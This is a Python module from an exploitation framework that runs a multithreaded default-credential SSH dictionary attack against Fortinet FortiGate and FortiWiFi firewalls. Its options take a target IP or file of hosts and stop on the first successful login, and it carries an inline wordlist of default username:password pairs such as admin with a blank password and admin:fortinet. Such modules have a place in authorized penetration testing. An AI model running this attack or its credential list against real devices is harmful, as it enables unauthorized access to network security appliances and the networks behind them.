# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.ssh_default import Exploit as SSHDefault


class Exploit(SSHDefault):
    """Fortinet FortiGate Default SSH Credentials.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Fortinet FortiGate Default SSH Credentials",
        "description": (
            "Dictionary attack with default credentials against Fortinet FortiGate SSH. "
            "Covers FortiGate 60E/80E/100E (SOHO/SMB) and FortiOS default accounts. "
            "Cherry-picked from FirewallXPL-Forge."
        ),
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": (
            "Fortinet FortiGate 60E / 80E / 100E / 200E",
            "Fortinet FortiWiFi 60E / 80E",
            "Fortinet FortiOS (any model, default config)",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(22, "Target SSH port")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist(
        "admin:,admin:admin,admin:password,admin:fortinet,admin:fortigate,admin:123456",
        "User:Pass pairs (file:// or inline comma-separated)",
    )
    stop_on_success = OptBool(True, "Stop on first valid authentication")
    verbosity = OptBool(True, "Display authentication attempts")
